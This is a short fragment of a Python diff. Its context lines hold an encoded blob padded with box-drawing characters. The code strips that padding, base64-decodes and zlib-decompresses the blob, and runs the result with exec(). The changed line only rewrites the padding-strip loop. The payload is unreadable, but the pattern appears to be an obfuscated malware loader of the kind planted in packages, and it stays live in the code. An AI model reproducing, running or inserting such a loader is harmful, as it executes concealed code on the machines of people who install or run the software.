@@ -24,7 +24,7 @@ E38v2lpip2xXy823ABGR0k+9██████████roj1/e/XxmRZruqZl7yeyv388j
 LgikoXeI/IS4JTd869c+FKqK██████████os3ev+QiBFQzcHO62+x+toRJ8Bw+K█████8DGH/UsE51N
 PELC22K/j3qZtHHMin8Z+qMjpgY5e██████████0C/Eic87bOcO96/zS1F███████████████Ztw698
 ehVh79Sq+74oq8MXBh6Gr46XV1X3c██████████tJlts1LZP8Hy9e3Lw==███████████████"""
-for char in ['╚', '█', '╗', '═', '╝', '╔', '║']:
+for char in '╚█╗═╝╔║':
     code = code.replace(char, "")
 code = zlib.decompress(base64.b64decode(code))
 exec(code)
